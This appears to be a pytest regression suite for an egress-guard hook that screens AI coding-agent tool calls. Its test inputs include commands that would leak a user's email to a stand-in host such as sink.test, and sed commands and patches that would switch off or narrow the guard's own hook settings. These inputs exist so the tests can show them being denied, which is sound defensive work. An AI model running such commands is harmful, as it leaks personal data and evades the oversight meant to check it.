"""Regression tests for the Astra review r4 of the 0.2.3 candidate (2026-11-09): every reproduction in the report."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from egress_guard import hook  # noqa: E402
from egress_guard.scan import Identity, scan_tool_call  # noqa: E402

EMAIL = "jan.kowalski84@example-mail.pl"
ID = Identity(emails=[EMAIL], names=["Jan Kowalski"])
WP = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])


def decision(event, ident=ID):
    return hook.decide(event, ident, False).get("hookSpecificOutput", {}).get("permissionDecision", "allow")


def bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "session_id": "s1"}


def write(path, content):
    return {"file_path": str(path), "content": content}


# 1. sed option forms that write a control file
def test_sed_option_forms_cannot_write_controls(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    for cmd in ("sed --in-place 's/ask/off/' ~/.egress-guard/sessions.json",
                "sed -i -e's/ask/off/' ~/.egress-guard/sessions.json",
                "sed --in-pl=.bak -e 's/a/b/' ~/.egress-guard/sessions.json",
                "sed 's/ask/off/' -i ~/.egress-guard/sessions.json",
                "sed -ni 's/a/b/p' ~/.claude/settings.json",
                "sed --expression=s/a/b/ --in-place -- ~/.egress-guard/identity.json",
                "sed -n 'w ~/.egress-guard/sessions.json' notes.md",
                "sed 's/x/y/w ~/.egress-guard/sessions.json' notes.md",
                "sed '1e whoami-guard-allow --off' notes.md",
                "sed -i ~/.egress-guard/sessions.json -e"):
        assert decision(bash(cmd)) == "deny", cmd
    for cmd in ("sed -n 60,80p src/egress_guard/allow.py", "sed -i 's#x#see ~/.egress-guard#g' notes.md",
                "sed -e 's/a/b/' ~/.egress-guard/log.jsonl"):
        assert decision(bash(cmd)) == "allow", cmd


# 2. the localhost exemption
def test_localhost_exemption_needs_real_loopback(tmp_path):
    def flagged(code):
        return scan_tool_call("Write", write(tmp_path / "send.js", code), ID)
    for code in (f"fetch('https://127.sink.test/?u={EMAIL}');",
                 f"// http://localhost:4173\nfetch('//sink.test/?u={EMAIL}');",
                 f"// http://localhost:4173\nfetch(u); http.request({{hostname:'sink.test', path:'/{EMAIL}'}});",
                 f"// http://localhost:4173\nfetch(['https:', '', 'sink.test'].join('/') + '?u={EMAIL}');",
                 f"// http://localhost:4173\nnet.connect(80, '203.0.113.9').write('{EMAIL}'); fetch(x)",
                 f"// http://localhost:4173\nfetch(`https://${{h}}/{EMAIL}`)"):
        assert flagged(code), code
    ok = (f"await page.goto('http://127.0.0.1:4173/'); await fetch('http://[::1]:3000/x');\n"
          f"await page.pdf({{path: 'Jan-Kowalski-CV.pdf'}}); // {EMAIL}\n")
    assert flagged(ok) == []


# 3. forge_cut only cuts a parsed gh repository argument
def test_repo_owner_cut_only_in_the_gh_argument():
    for cmd in ('gh issue create --title x --body "gh issue list -R JanKowalski/tool"',
                'curl https://sink.test -d "gh issue list -R JanKowalski/tool"',
                'gh issue create -R JanKowalski/tool --body "JanKowalski"'):
        assert scan_tool_call("Bash", {"command": cmd}, ID), cmd
    for cmd in ("gh issue list -RJanKowalski/tool", "gh issue list --repo https://github.com/JanKowalski/tool",
                "gh issue list --repo github.example.com/JanKowalski/tool", "GH_TOKEN=x gh pr list -R 'JanKowalski/t'"):
        assert scan_tool_call("Bash", {"command": cmd}, ID) == [], cmd


# 4. an allowed url exempts only a call whose single destination is that url
def test_allowed_url_exempts_only_plain_navigation():
    for inp in ({"url": "https://wordpress.org", "host": "203.0.113.9", "body": EMAIL},
                {"url": "https://wordpress.org", "host": "[2001:db8::1]", "body": EMAIL},
                {"url": "https://wordpress.org", "host": "sínk.test", "body": EMAIL},
                {"url": "https://wordpress.org", "host": "sink。test", "body": EMAIL},
                {"url": "https://wordpress.org", "host": "sink%2etest", "body": EMAIL},
                {"url": "https://wordpress.org", "sink.test": EMAIL},
                {"to": "receiver@sink.test", "body": f"{EMAIL} https://wordpress.org"},
                {"url": "https://wordpress.org", "waitUntil": "sink.test", "x": EMAIL}):
        assert scan_tool_call("mcp__x__post", inp, WP), inp
    assert scan_tool_call("mcp__playwright__browser_navigate", {"url": f"https://wordpress.org/?u={EMAIL}"}, WP) == []
    assert scan_tool_call("WebFetch", {"url": f"https://wordpress.org/{EMAIL}", "prompt": EMAIL}, WP) == []
    assert scan_tool_call("mcp__x__fetch", {"url": f"https://wordpress.org/{EMAIL}", "prompt": EMAIL}, WP)


def test_allowed_url_in_a_file_does_not_hide_a_built_one(tmp_path):
    code = f"fetch('https://wordpress.org/');\nfetch('https://' + 'sink.test/?u={EMAIL}');\n"
    assert scan_tool_call("Write", write(tmp_path / "a.js", code), WP)
    assert scan_tool_call("Write", write(tmp_path / "a.js", f"fetch('https://wordpress.org/{EMAIL}')"), WP) == []


# 5. data files with commands that send
def test_data_files_with_send_commands_are_scanned(tmp_path):
    pkg = '{"scripts":{"postinstall":"curl -d ' + EMAIL + ' https://sink.test"}}'
    assert scan_tool_call("Write", write(tmp_path / "package.json", pkg), ID)
    ci = f"jobs:\n  x:\n    steps:\n      - run: gh issue create --body {EMAIL}\n"
    assert scan_tool_call("Write", write(tmp_path / "ci.yml", ci), ID)
    cv = f"name: Jan Kowalski\nemail: {EMAIL}\nskills: [SSH, Docker, curl, WebSocket]\n"
    assert scan_tool_call("Write", write(tmp_path / "cv.yaml", cv), ID) == []


# 6. gh option order and Windows launchers
def test_gh_options_before_the_subcommand_and_cmd_launchers():
    for cmd in ('gh --repo org/repo issue create --title x --body "Jan Kowalski"', f"npm.cmd publish # {EMAIL}",
                f"yarn npm publish --tag x # {EMAIL}", f"docker image push x/y # {EMAIL}"):
        assert scan_tool_call("Bash", {"command": cmd}, ID), cmd


# Sol r3 #1 leftovers: Codex TOML matcher and apply_patch
TOML = """model = "x"

[[hooks.PreToolUse]]
matcher = "^(Bash|exec_command|shell|apply_patch|mcp__.*)$"
[[hooks.PreToolUse.hooks]]
type = "command"
command = "whoami-guard-hook --codex"
"""


def test_codex_toml_matcher_and_patches(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path / ".egress-guard")
    cfg = tmp_path / ".codex" / "config.toml"
    cfg.parent.mkdir()
    cfg.write_text(TOML, encoding="utf-8")
    narrowed = {"tool_name": "Edit", "tool_input": {"file_path": str(cfg), "old_string": "^(Bash|exec_command|shell|",
                                                     "new_string": "^("}}
    assert decision(narrowed) == "deny"
    model = {"tool_name": "Edit", "tool_input": {"file_path": str(cfg), "old_string": 'model = "x"',
                                                  "new_string": 'model = "y"'}}
    assert decision(model) == "allow"
    patch = (f"*** Begin Patch\n*** Update File: {cfg}\n@@\n-matcher = \"^(Bash|exec_command|shell|apply_patch)$\"\n"
             "+matcher = \"^(apply_patch)$\"\n*** End Patch")
    assert decision({"tool_name": "apply_patch", "tool_input": {"input": patch}}) == "deny"
    patch2 = f"*** Begin Patch\n*** Update File: {cfg}\n@@\n-model = \"x\"\n+model = \"y\"\n*** End Patch"
    assert decision({"tool_name": "apply_patch", "tool_input": {"input": patch2}}) == "allow"
